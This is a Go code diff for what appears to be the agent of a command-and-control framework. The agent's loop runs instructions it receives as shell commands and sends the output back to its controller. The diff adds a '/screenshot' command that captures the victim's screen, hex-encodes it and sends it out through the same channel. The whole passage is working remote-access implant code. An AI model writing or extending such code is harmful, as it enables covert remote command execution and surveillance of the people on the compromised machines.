@@ -2,10 +2,12 @@ package main
 
 import (
 	"common/utils"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"time"
 
+	"github.com/zarkones/ControlABILITY/screenshot"
 	profiles "github.com/zarkones/ControlPROFILE"
 )
 
@@ -28,14 +30,25 @@ func main() {
 			continue
 		}
 
-		output, err := shell(instruction)
-		if err != nil {
-			if len(output) == 0 {
-				output = err.Error()
-			} else {
-				output += "\n" + err.Error()
+		output := func() string {
+			if instruction == "/screenshot" {
+				captured, err := screenshot.Capture()
+				if err != nil {
+					return err.Error()
+				}
+				return hex.EncodeToString(captured)
 			}
-		}
+
+			output, err := shell(instruction)
+			if err != nil {
+				if len(output) == 0 {
+					output = err.Error()
+				} else {
+					output += "\n" + err.Error()
+				}
+			}
+			return output
+		}()
 
 		if err := send(&agentId, &profile, &output); err != nil {
 			fmt.Println("send error:", err)
